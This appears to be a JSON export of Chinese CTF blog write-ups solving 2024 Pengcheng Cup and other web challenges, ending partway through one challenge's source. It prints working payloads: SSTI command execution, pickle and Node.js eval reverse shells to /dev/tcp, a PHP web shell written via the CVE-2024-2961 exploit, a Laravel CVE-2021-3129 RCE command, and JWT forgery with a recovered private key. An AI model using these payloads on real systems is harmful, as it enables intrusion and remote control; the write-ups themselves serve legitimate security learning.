[{"content":"学弟们太强了\n口算 1s内算式，使用python算就行（直接使用eval不安全，大家不要学），然后可以得到hint：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 @app.route(\u0026#39;/\u0026#39;) def index(solved=0): global current_expr # 前端计算 ..... ..... # 通过计算 username = \u0026#39;ctfer!\u0026#39; if request.args.get(\u0026#39;username\u0026#39;): username = request.args.get(\u0026#39;username\u0026#39;) if whitelist_filter(username,whitelist_patterns): if blacklist_filter(username): return render_template_string(\u0026#34;filtered\u0026#34;) else: print(\u0026#34;你过关！\u0026#34;) else: return render_template_string(\u0026#34;filtered\u0026#34;) return render_template(\u0026#39;index.html\u0026#39;, username=username, hint=\u0026#34;f4dd790b-bc4e-48de-b717-903d433c597f\u0026#34;) 可以看到有一个ssti盲打，主要是空格等被过滤了，用十六进制绕过，因为popen里面还有一段python代码需要执行，因此需要eval：\n（明明hint中是get参数，结果实际上是post，懵了半天）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import requests session = requests.Session() res = session.get(\u0026#34;http://192.168.18.28/calc\u0026#34;) c = res.text print(c) result = eval(c) print(result) cmd=\u0026#39;cat /flag\u0026#39; cmd=cmd.encode(\u0026#39;utf-8\u0026#39;).hex() data = {\u0026#34;username\u0026#34;:\u0026#34;{{g.pop.__globals__.__builtins__[\u0026#39;eval\u0026#39;](\\\u0026#34;__import__(\u0026#39;os\u0026#39;).popen(bytes.fromhex(\u0026#39;636174202f666c6167\u0026#39;).decode()).read()\\\u0026#34;)}}\u0026#34;} print(data) res = session.post(\u0026#34;http://192.168.18.28/?Submit=%E6%8F%90%E4%BA%A4\u0026amp;answer=\u0026#34;+str(result),data=data) print(res.text) ez_python 扫出一个login路由，爆破得到账号test:123456，返回一个token：\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCIsInJvbGUiOiJ0ZXN0IiwiZXhwIjoxNzMxMTIwMTQ5fQ.OXE4Os6vL6dZ8KyWeH-CUDKmIBSvUIv15luP8VqXF8o 直接爆破可以得到密钥a123456，修改jwt为admin之后返回“听说ser有点东西”\n访问ser路由得到一个pickle反序列化\n随便找个payload打就行：\n1 2 3 4 (S\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39; ios system . 1 {\u0026#34;pickled\u0026#34;:\u0026#34;KFMnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC94eHgvODg4OCAwPiYxIicNCmlvcw0Kc3lzdGVtDQou\u0026#34;} not admin 源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 const express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const jwt = require(\u0026#39;jsonwebtoken\u0026#39;); let { User } = require(\u0026#39;./user\u0026#39;); const crypto = require(\u0026#39;crypto\u0026#39;); const path = require(\u0026#39;path\u0026#39;) const app = express(); const port = 3000; app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); app.set(\u0026#39;views\u0026#39;, path.join(__dirname, \u0026#39;views\u0026#39;)); app.use(express.static(\u0026#39;public\u0026#39;)); app.use(bodyParser.urlencoded({ extended: true })); app.use(express.json()); const tmp_user = {} function authenticateToken(req, res, next) { const authHeader = req.headers[\u0026#39;authorization\u0026#39;]; const token = authHeader; if (tmp_user.secretKey == undefined) { tmp_user.secretKey = crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;); } if (!token) { return res.redirect(\u0026#39;/login\u0026#39;); } try { const decoded = jwt.verify(token, tmp_user.secretKey); req.user = decoded; next(); } catch (ex) { return res.status(400).send(\u0026#39;Invalid token.\u0026#39;); } } const merge = (a, b) =\u0026gt; { for (var c in b) { console.log(JSON.stringify(b[c])); if (check(b[c])) { if (a.hasOwnProperty(c) \u0026amp;\u0026amp; b.hasOwnProperty(c) \u0026amp;\u0026amp; typeof a[c] === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; typeof b[c] === \u0026#39;object\u0026#39;) { merge(a[c], b[c]); } else { a[c] = b[c]; } } else { return 0 } } return a } console.log(tmp_user.secretKey) var check = function (str) { let input = /const|var|let|return|subprocess|Array|constructor|load|push|mainModule|from|buffer|process|child_process|main|require|exec|this|eval|while|for|function|hex|char|base|\u0026#34;|\u0026#39;|\\\\|\\[|\\+|\\*/ig; if (typeof str === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; str !== null) { for (let key in str) { if (!check(key)) { return false; } if (!check(str[key])) { return false; } } return true; } else { return !input.test(str); } }; app.get(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;login\u0026#39;) }); app.post(\u0026#39;/login\u0026#39;, (req, res) =\u0026gt; { if (merge(tmp_user, req.body)) { if (tmp_user.secretKey == undefined) { tmp_user.secretKey = crypto.randomBytes(16).toString(\u0026#39;hex\u0026#39;); } if (User.verifyLogin(tmp_user.password)) { const token = jwt.sign({ username: tmp_user.username }, tmp_user.secretKey); res.send(`Login successful! Token: ${token}\\nBut nothing happend~`); } else { res.send(\u0026#39;Login failed!\u0026#39;); } } else { res.send(\u0026#34;Hacker denied!\u0026#34;) } }); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { authenticateToken(req, res, () =\u0026gt; { backcode = eval(tmp_user.code) res.send(\u0026#34;something happend~\u0026#34;) }); }); app.listen(port, () =\u0026gt; { console.log(`Server running at http://localhost:${port}`); }); 本来以为是原型链污染，结果仔细看了下merge的时候直接改就行，不用原型链\n首先注意到authenticateToken函数只是单纯验证secretKey，而secretKey是我们可以修改的，因此我们可以先发包修改secretKey：\n1 username=admin\u0026amp;password=123456\u0026amp;secretKey=1234 然后用自己的key生成一个jwt：\n1 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImsxdGUifQ.Pzma-LxIRrefIx88I6DLGsUz7Mh1Syc5b5WodL59AlE 然后拿这个jwt通过authenticateToken函数即可:\n接着是绕过check函数，只需要对其进行覆盖即可：\n1 code=check=(str)=\u0026gt;true; 使用payloadrequire('child_process').execSync('sleep 3')可以确定已经rce了\n最后因为没有回显，反弹shell：\n1 code=require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;bash -c \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/xxx/8888 0\u0026gt;\u0026amp;1\u0026#34;\u0026#39;) fileread 给源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php class cls1{ var $cls; var $arr; function show(){ show_source(__FILE__); } function __wakeup(){ foreach($this-\u0026gt;arr as $k =\u0026gt; $v) echo $this-\u0026gt;cls-\u0026gt;$v; } } class cls2{ var $filename = \u0026#39;hello.php\u0026#39;; var $txt = \u0026#39;\u0026#39;; function __get($key){ var_dump($key); if($key == \u0026#39;fileput\u0026#39;) return $this-\u0026gt;fileput(); else return \u0026#39;\u0026lt;p\u0026gt;\u0026#39;.htmlspecialchars($key).\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } function fileput(){ echo \u0026#39;Your file:\u0026#39;.file_get_contents($this-\u0026gt;filename); } } if(!empty($_GET)){ $cls = base64_decode($_GET[\u0026#39;ser\u0026#39;]); $instance = unserialize($cls); }else{ $a = new cls1(); $a-\u0026gt;show(); } ?\u0026gt; 首先是一个简单的反序列化，链子：\n1 cls1-\u0026gt;__wakeup()==\u0026gt;cls2-\u0026gt;__get()==\u0026gt;cls2-\u0026gt;fileput() 反序列化脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 \u0026lt;?php class cls1{ var $cls; var $arr; function __construct($filename){ $this-\u0026gt;cls = new cls2($filename); $this-\u0026gt;arr = array(\u0026#34;fileput\u0026#34;); } function show(){ show_source(__FILE__); } function __wakeup(){ foreach($this-\u0026gt;arr as $k =\u0026gt; $v) echo $this-\u0026gt;cls-\u0026gt;$v; } } class cls2{ var $filename; var $txt = \u0026#39;\u0026#39;; function __construct($filename){ $this-\u0026gt;filename = $filename; } function __get($key){ var_dump($key); if($key == \u0026#39;fileput\u0026#39;) return $this-\u0026gt;fileput(); else return \u0026#39;\u0026lt;p\u0026gt;\u0026#39;.htmlspecialchars($key).\u0026#39;\u0026lt;/p\u0026gt;\u0026#39;; } function fileput(){ echo \u0026#39;Your file:\u0026#39;.file_get_contents($this-\u0026gt;filename); } } // if(!empty($_GET)){ // $cls = base64_decode($_GET[\u0026#39;ser\u0026#39;]); // $instance = unserialize($cls); // }else{ // $a = new cls1(); // $a-\u0026gt;show(); // } if ($argc === 1){ $filename = $argv[0]; echo base64_encode(serialize(new cls1($filename))); } 打过去发现没权限，使用cnext，参考vulhub/php/CVE-2024-2961/README.zh-cn.md at master · vulhub/vulhub，exp来自：https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py，这里只修改了Remote类：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 class Remote: \u0026#34;\u0026#34;\u0026#34;A helper class to send the payload and download files. The logic of the exploit is always the same, but the exploit needs to know how to download files (/proc/self/maps and libc) and how to send the payload. The code here serves as an example that attacks a page that looks like: `php \u0026lt;?php $data = file_get_contents($_POST[\u0026#39;file\u0026#39;]); echo \u0026#34;File contents: $data\u0026#34;; ` Tweak it to fit your target, and start the exploit. \u0026#34;\u0026#34;\u0026#34; def __init__(self, url: str) -\u0026gt; None: self.url = url self.session = Session() def send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; # return self.session.post(self.url, data={\u0026#34;file\u0026#34;: path}) result = subprocess.run([\u0026#39;php\u0026#39;, \u0026#39;ser.php\u0026#39;, path], capture_output=True, text=True) # print(result) payload = result.stdout return self.session.get(self.url, params={\u0026#34;ser\u0026#34;: payload}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) data = response.re.search(b\u0026#34;Your file:(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) 命令行：\n1 python my-cnext.py http://target-ip/ \u0026#34;echo \u0026#39;\u0026lt;?=@eval(\\$_POST[1]);?\u0026gt;\u0026#39; \u0026gt; shell.php\u0026#34; LookUp java不会（在学了在学了:sob:）\nezLaravel 根据版本找到CVE-2021-3129，参考vulhub/laravel/CVE-2021-3129 at master · vulhub/vulhub，用工具直接打就行\n1 python CVE-2021-3129.py --chain Laravel/RCE12 --host \u0026#34;http://target-ip/\u0026#34; --force ","date":"2024-11-12T20:17:54+08:00","permalink":"https://k1te.cn/p/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E9%A2%98%E8%A7%A3/","title":"2024鹏城杯Web题解"},{"content":"web01 和广东省赛的hackme差不多，上回没做出来，这次可算出了。\n首先通过爆破拿到了test:123456账号，发现token是jwt，拿去解析发现算法是RS256，立马联想到之前做过的省赛，然后试了以下拿到了另一个账号test1:123456。参考CTFtime.org / DownUnderCTF 2021 (Online) / JWT / Writeup，现在拿到两个jwt：\n1 2 test:\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#34; test1:\t\u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5\u0026#34; 通过工具FlorianPicca/JWT-Key-Recovery: A tool that recovers the public key used to sign JWT tokens找公钥：\n为了让我们能够攻击得到私钥，q设的特别小，因此需要使用-v参数，将剔除掉的q拿到，他得到的n其实是p：\n这里，p，q分别是178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071，37\n利用脚本得到私钥（脚本来自qsdz）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import rsa from pathlib import Path admin_token = \u0026#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#39; test_token = \u0026#39;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QxIn0.DLsur1m0A1k4Y-mfdrS-Ki4HnuZpB94Zw_v3HmVKGYwf3ahc97Vn5ayd-68sgcmEY6RFROfRPgtdwkLRv4fwo3s8b3-XEYR7xUdAT3d4Hv2B8GsyNy2XVKa1HPFPMds6dRJSBbj_1C6JIWzGWXSBmfBZh9mCO_6X5r8JiSiJBnA5\u0026#39; n = 6587783811255857213423501659427445485733195847244841084416640087322920370505793710077653863560859194967014206895990092487007042261038365083278115634611522557149583345006263576760669731901928303983263803856696693078515488443260501485292429482201628351549976050972015840536205463606752217154446907981710898447627 p = 178048211115023167930364909714255283398194482357968677957206488846565415419075505677774428744888086350459843429621353851000190331379415272521030152286797906949988739054223339912450533294646710918466589293424234948067986174142175715818714310329773739231080433810054482176654201719101411274444511026532726985071 q = 37 # p, q = q, p e = 65537 phi = (p - 1) * (q - 1) d = pow(e, -1, phi) Path(\u0026#39;public.pem\u0026#39;).write_bytes(rsa.PublicKey(n, e).save_pkcs1()) Path(\u0026#39;private.pem\u0026#39;).write_bytes(rsa.PrivateKey(n, e, d, p, q).save_pkcs1()) 利用得到的公私钥生成admin的jwt：\n1 2 3 4 5 6 import jwt test_jwt = \u0026#34;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.Itrnrno7k2sM5JAMDLy8h9o217gOaHcX0HHXOBgX0ht8ZcoSoDGgtXFFl4GSTRwn5dBzy2ATJu0kO0rAckS3K5gJE7I1WpBkq7SGOs6E7mA-qCVCbnf9Xpv7XPTLqdCqtYIpwkBi9Z-YlYhJcLPunMv8r9YPuuS-wlwwnsutxEMK\u0026#34; private_key = b\u0026#34;-----BEGIN RSA PRIVATE KEY-----\\nMIICoQIBAAKBgSSlUMfCzg/ysG4ixoi6NKGuWNnvIpZZTRNa045eH2xzzY/ZyRwD\\nojStMH5wxG6nOVvNAY/ETx2XPPC6J1J//nzC1fANMNCYRa47xIW0RwZBDSABcGnw\\nu3QP2nr7AR0/tZmSClncdwA7RKzlJM8Fs7Zmb502ZMSv0AxMgN5UMh9FCwIDAQAB\\nAoGBC5/r+nCv2+uWXTjL8i6UJtLIfdOssxKbJNiIKLXQh3l8IAAfx1i9ktxYEICW\\nTcGTUkx9gjd+xUwo0KOKjcg3hZc7bEfLkiOsK8dSwsPFEXYQpCE1EFokhkc9Rbiq\\nURC9QIrQjtzf5vdU2usj5ddRGtqtmpXm/ibU1TLPIsy8Y5TJAoGBAP2Mj8b+pnwu\\nSCp0EYh99ogr6jblQlVwySv34UDQarcFjkQoB60SOMZpGCyPr/auhfDIsNvKyXLK\\nS7IBEBFMETWywUx28OGFV7xtGF7RfLWmaKYXy4ML/DfHonV8khZ6h5wpyxPL3Wli\\nuJCSSsjNgXhj4aeGLtRRuySpiXflrdFvAgElAoGBALrhzOO+tJWZQ2XPMVEqjvjl\\nbXfS2WbCf/Theuzb8Zw/AxJncuj1IlXUBpZpvigTkPPd6MXIHV13j/1+3QnyyEiN\\nHf6vOHLxZq6itrDEtafqJP4vUbigr+GpSqxQChl5bNUE1QMdY3AW7LTarzZ8iq5i\\n6GMi+wdRyp+GOqXd65UPAgERAoGAUjts5pfHSt6T8hfOVcf87eS6qgUqRTlWAGwR\\ntCfrQkb9tT1qRfgSadzlPuJ+QirDqAm80amNcVZdvTDG8NpmckfP/R+oEcphpOUc\\nqSFY4PezPMlyb7DcLcQ0sHttpmztthtkdR+GFFdedBPFOjTQC16qDNGSpbmkepfZ\\njqta99E=\\n-----END RSA PRIVATE KEY-----\u0026#34; public_key = b\u0026#34;-----BEGIN RSA PUBLIC KEY-----\\nMIGJAoGBJKVQx8LOD/KwbiLGiLo0oa5Y2e8illlNE1rTjl4fbHPNj9nJHAOiNK0w\\nfnDEbqc5W80Bj8RPHZc88LonUn/+fMLV8A0w0JhFrjvEhbRHBkENIAFwafC7dA/a\\nevsBHT+1mZIKWdx3ADtErOUkzwWztmZvnTZkxK/QDEyA3lQyH0ULAgMBAAE=\\n-----END RSA PUBLIC KEY-----\u0026#34; encoded = jwt.encode({\u0026#34;username\u0026#34;: \u0026#34;admin\u0026#34;}, private_key, algorithm=\u0026#34;RS256\u0026#34;) print(encoded) 得到jwt token：eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.DNqIFNdFOWgGGnuk95SQa5GdU_D6TDv95lTU97wUP8ekgqX6zrnvvsnp8XkvVfSx0g3xVQqbo5xhdxjNpM8LiiwX_kQ8FO8t0q0qBn1RJ5O2bGkGOZsUWAUrKg7ME6L4-XFiXi7P328f1t4En_kSp91SeS7-9Lcn7Ja__IJbRuH1\n登录之后首先看game，发现非常抽象，通过fuzz知道emoji对应不同的字符，会将其作为命令执行，构造💿 🚩😜😐🐱 ⭐，即CD flag;P:|cat *的到源码:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 from flask import Flask, render_template, redirect, url_for, flash, session, request, jsonify, make_response from flask_wtf import FlaskForm from wtforms import StringField, PasswordField, SubmitField, FileField, TextAreaField from wtforms.validators import DataRequired, Length from werkzeug.utils import secure_filename import os import string from authlib.jose import jwt, JoseError import requests app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;36f8efbea152e50b23290e0ed707b4b0\u0026#39; with open(\u0026#39;/app/flag/private_key.pem\u0026#39;, \u0026#39;r\u0026#39;) as f: private_key = f.read() with open(\u0026#39;/app/flag/public_key.pem\u0026#39;, \u0026#39;r\u0026#39;) as f: public_key = f.read() def game_play(user_input): emoji_table = { \u0026#34;😀\u0026#34;: \u0026#34;:D\u0026#34;, \u0026#34;😉\u0026#34;: \u0026#34;;)\u0026#34;, \u0026#34;😊\u0026#34;: \u0026#34;:)\u0026#34;, \u0026#34;😋\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;😎\u0026#34;: \u0026#34;B)\u0026#34;, \u0026#34;🤔\u0026#34;: \u0026#34;:?\u0026#34;, \u0026#34;😐\u0026#34;: \u0026#34;:|\u0026#34;, \u0026#34;😥\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;😮\u0026#34;: \u0026#34;:o\u0026#34;, \u0026#34;🤐\u0026#34;: \u0026#34;:x\u0026#34;, \u0026#34;😯\u0026#34;: \u0026#34;:o\u0026#34;, \u0026#34;😪\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;😫\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;😴\u0026#34;: \u0026#34;Zzz\u0026#34;, \u0026#34;😜\u0026#34;: \u0026#34;;P\u0026#34;, \u0026#34;😝\u0026#34;: \u0026#34;XP\u0026#34;, \u0026#34;😒\u0026#34;: \u0026#34;:/\u0026#34;, \u0026#34;🙃\u0026#34;: \u0026#34;(:\u0026#34;, \u0026#34;😲\u0026#34;: \u0026#34;:O\u0026#34;, \u0026#34;☹️\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;🙁\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;😖\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;😞\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;😤\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;😢\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;😦\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;😰\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;😱\u0026#34;: \u0026#34;:O\u0026#34;, \u0026#34;🤪\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;😵\u0026#34;: \u0026#34;X(\u0026#34;, \u0026#34;🥴\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;😠\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;😡\u0026#34;: \u0026#34;\u0026gt;:(\u0026#34;, \u0026#34;🤕\u0026#34;: \u0026#34;:(\u0026#34;, \u0026#34;🤢\u0026#34;: \u0026#34;X(\u0026#34;, \u0026#34;🤮\u0026#34;: \u0026#34;:P\u0026#34;, \u0026#34;🤧\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;😇\u0026#34;: \u0026#34;O:)\u0026#34;, \u0026#34;🥳\u0026#34;: \u0026#34;:D\u0026#34;, \u0026#34;🥺\u0026#34;: \u0026#34;:\u0026#39;(\u0026#34;, \u0026#34;🤡\u0026#34;: \u0026#34;:o)\u0026#34;, \u0026#34;🤠\u0026#34;: \u0026#34;Y)\u0026#34;, \u0026#34;🤥\u0026#34;: \u0026#34;:L\u0026#34;, \u0026#34;🐶\u0026#34;: \u0026#34;dog\u0026#34;, \u0026#34;🐱\u0026#34;: \u0026#34;cat\u0026#34;, \u0026#34;🐭\u0026#34;: \u0026#34;mouse\u0026#34;, \u0026#34;🐰\u0026#34;: \u0026#34;rabbit\u0026#34;, \u0026#34;🦊\u0026#34;: \u0026#34;fox\u0026#34;, \u0026#34;🐷\u0026#34;: \u0026#34;pig\u0026#34;, \u0026#34;🐽\u0026#34;: \u0026#34;pig nose\u0026#34;, \u0026#34;🐸\u0026#34;: \u0026#34;frog\u0026#34;, \u0026#34;🐒\u0026#34;: \u0026#34;monkey\u0026#34;, \u0026#34;🐔\u0026#34;: \u0026#34;chicken\u0026#34;, \u0026#34;🐧\u0026#34;: \u0026#34;penguin\u0026#34;, \u0026#34;🐦\u0026#34;: \u0026#34;bird\u0026#34;, \u0026#34;🚗\u0026#34;: \u0026#34;car\u0026#34;, \u0026#34;🚕\u0026#34;: \u0026#34;taxi\u0026#34;, \u0026#34;🚁\u0026#34;: \u0026#34;helicopter\u0026#34;, \u0026#34;🛶\u0026#34;: \u0026#34;canoe\u0026#34;, \u0026#34;⛵\u0026#34;: \u0026#34;sailboat\u0026#34;, \u0026#34;🚤\u0026#34;: \u0026#34;speedboat\u0026#34;, \u0026#34;🛳️\u0026#34;: \u0026#34;passenger ship\u0026#34;, \u0026#34;⛴️\u0026#34;: \u0026#34;ferry\u0026#34;, \u0026#34;🛥️\u0026#34;: \u0026#34;motor boat\u0026#34;, \u0026#34;🚢\u0026#34;: \u0026#34;ship\u0026#34;, \u0026#34;👶\u0026#34;: \u0026#34;baby\u0026#34;, \u0026#34;💿\u0026#34;: \u0026#34;CD\u0026#34;, \u0026#34;📀\u0026#34;: \u0026#34;DVD\u0026#34;, \u0026#34;📱\u0026#34;: \u0026#34;phone\u0026#34;, \u0026#34;💻\u0026#34;: \u0026#34;laptop\u0026#34;, \u0026#34;⏰\u0026#34;: \u0026#34;alarm clock\u0026#34;, \u0026#34;🕰️\u0026#34;: \u0026#34;mantelpiece clock\u0026#34;, \u0026#34;⌚\u0026#34;: \u0026#34;watch\u0026#34;, \u0026#34;📡\u0026#34;: \u0026#34;satellite antenna\u0026#34;, \u0026#34;🔋\u0026#34;: \u0026#34;battery\u0026#34;, \u0026#34;🔌\u0026#34;: \u0026#34;plug\u0026#34;, \u0026#34;🚩\u0026#34;: \u0026#34;flag\u0026#34;, \u0026#34;⭐\u0026#34;: \u0026#34;*\u0026#34;, \u0026#34;✖️\u0026#34;: \u0026#34;×\u0026#34;, \u0026#34;➗\u0026#34;: \u0026#34;÷\u0026#34; } if len(set(user_input).intersection(set(string.printable.replace(\u0026#34; \u0026#34;, \u0026#39;\u0026#39;)))) \u0026gt; 0: return user_input.lower() command = user_input result = \u0026#39;emoji shell\u0026#39; for key in emoji_table: if key in command: command = command.replace(key, emoji_table[key]).lower() result = command result = result + os.popen(command + \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;).read() return result class LoginForm(FlaskForm): username = StringField(\u0026#39;Username\u0026#39;, validators=[DataRequired(), Length(min=1, max=25)]) password = PasswordField(\u0026#39;Password\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Login\u0026#39;) class UploadForm(FlaskForm): avatar = FileField(\u0026#39;Choose a file\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Upload\u0026#39;) class GameForm(FlaskForm): user_input = TextAreaField(\u0026#39;Enter something\u0026#39;, validators=[DataRequired()]) submit = SubmitField(\u0026#39;Submit\u0026#39;) def generate_jwt(username): header = {\u0026#39;alg\u0026#39;: \u0026#39;RS256\u0026#39;} payload = { \u0026#39;username\u0026#39;: username, } token = jwt.encode(header, payload, private_key) return token def decode_jwt(token): try: payload = jwt.decode(token, public_key) return payload except JoseError as e: return None @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): form = LoginForm() if form.validate_on_submit(): username = form.username.data password = form.password.data if username==\u0026#39;admin\u0026#39;: flash(\u0026#39;Invalid username or password\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;, form=form) if username: session[\u0026#39;role\u0026#39;] = \u0026#39;guest\u0026#39; token = generate_jwt(username) response = make_response(redirect(url_for(\u0026#39;dashboard\u0026#39;))) response.set_cookie(\u0026#39;token\u0026#39;, token.decode()) flash(\u0026#39;Login successful!\u0026#39;, \u0026#39;success\u0026#39;) return response else: flash(\u0026#39;Invalid username or password\u0026#39;, \u0026#39;danger\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;, form=form) @app.route(\u0026#39;/dashboard\u0026#39;) def dashboard(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) if not payload: flash(\u0026#39;Invalid or expired token. Please login again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;dashboard.html\u0026#39;) @app.route(\u0026#39;/profile\u0026#39;) def profile(): token = request.cookies.get(\u0026#39;token\u0026#39;) if not token: flash(\u0026#39;Please login first\u0026#39;, \u0026#39;warning\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) payload = decode_jwt(token) if not payload: flash(\u0026#39;Invalid or expired token. Please login again.\u0026#39;, \u0026#39;danger\u0026#39;) return redirect(url_for(\u0026#39;login\u0026#39;)) user_info = {} user_info.update({ \u0026#39;username\u0026#39;: payload[\u0026#39;username\u0026#39;], \u0026#39;role\u0026#39;: session[\u0026#39;role\u0026#39;], }) return render_template(\u0026#39;profile.html\u0026#39;, user_info=user_info) @app.route(\u0026#39;/game\u0026#39;, 